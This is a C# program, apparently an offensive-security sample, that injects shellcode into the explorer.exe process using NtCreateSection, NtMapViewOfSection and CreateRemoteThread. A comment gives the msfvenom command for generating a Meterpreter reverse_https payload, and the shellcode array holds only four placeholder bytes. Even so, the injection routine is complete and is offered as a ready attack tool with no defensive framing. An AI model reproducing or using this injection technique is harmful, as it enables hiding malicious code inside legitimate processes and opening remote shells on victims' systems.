using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Standard_Process_Injection_Alternative
{
	class Program
	{
		// OpenProcess - kernel32.dll
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		// CreateRemoteThread - kernel32.dll
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(
			IntPtr hProcess,
			IntPtr lpThreadAttributes,
			uint dwStackSize,
			IntPtr lpStartAddress,
			IntPtr lpParameter,
			uint dwCreationFlags,
			IntPtr lpThreadId);

		// GetCurrentProcess - kernel32.dll
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr GetCurrentProcess();

		// ntdll.dll API functions:
		// NtCreateSection
		[DllImport("ntdll.dll")]
		public static extern UInt32 NtCreateSection(
			ref IntPtr section,
			UInt32 desiredAccess,
			IntPtr pAttrs,
			ref long MaxSize,
			uint pageProt,
			uint allocationAttribs,
			IntPtr hFile);

		// NtMapViewOfSection
		[DllImport("ntdll.dll")]
		public static extern UInt32 NtMapViewOfSection(
			IntPtr SectionHandle,
			IntPtr ProcessHandle,
			ref IntPtr BaseAddress,
			IntPtr ZeroBits,
			IntPtr CommitSize,
			ref long SectionOffset,
			ref long ViewSize,
			uint InheritDisposition,
			uint AllocationType,
			uint Win32Protect);

		// NtUnmapViewOfSection
		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtUnmapViewOfSection(
			IntPtr hProc,
			IntPtr baseAddr);

		// NtClose
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
		static extern int NtClose(IntPtr hObject);

		static int Main(string[] args)
		{
			// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f csharp
			byte[] buf = new byte[4] {0xfc,0x48,0x83,0xe4 };
			
			long buffer_size = buf.Length;

			// Create the section handle.
			IntPtr ptr_section_handle = IntPtr.Zero;
			UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

			// Map a view of a section into the virtual address space of the current process.
			long local_section_offset = 0;
			IntPtr ptr_local_section_addr = IntPtr.Zero;
			UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

			// Copy the shellcode into the mapped section.
			Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

			// Map a view of the section in the virtual address space of the targeted process.
			var process = Process.GetProcessesByName("explorer")[0];
			IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
			IntPtr ptr_remote_section_addr = IntPtr.Zero;
			UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

			// Unmap the view of the section from the current process & close the handle.
			NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
			NtClose(ptr_section_handle);

			CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
			return 0;
		}
	}
}
